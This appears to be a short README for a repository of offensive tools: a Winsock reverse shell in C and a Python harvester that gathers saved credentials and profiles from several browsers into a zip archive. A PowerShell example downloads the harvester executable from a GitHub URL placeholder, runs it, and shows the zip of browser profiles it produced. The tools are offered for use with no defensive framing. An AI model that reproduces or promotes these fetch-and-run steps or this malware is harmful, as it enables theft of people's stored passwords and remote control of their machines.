## Simple reverse shell (C)
It's a simple reverse shell in C (duh), it uses winsock 2.2 and you have to set your IP and port in the dedicated variables in the code, i tried to document the code well in comments.


## Browser Credential Harvester (Python)
Python tool that harvests Firefox, Edge, Chrome, Brave, Opera ( | GX ) and Vivaldi to put them in a password protected (this part still doesn't work) zip archive.
```powershell
PS C:\tempdir> Invoke-WebRequest "[github url]" -o Harvestcred.exe
PS C:\tempdir> .\Harvestcred.exe
PS C:\tempdir> ls


    Répertoire : C:\tempdir


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        07/11/2025     14:43          20319 browser_profiles_20251107_144319.zip
-a----        07/11/2025     14:43        7265288 Harvestcred.exe
```
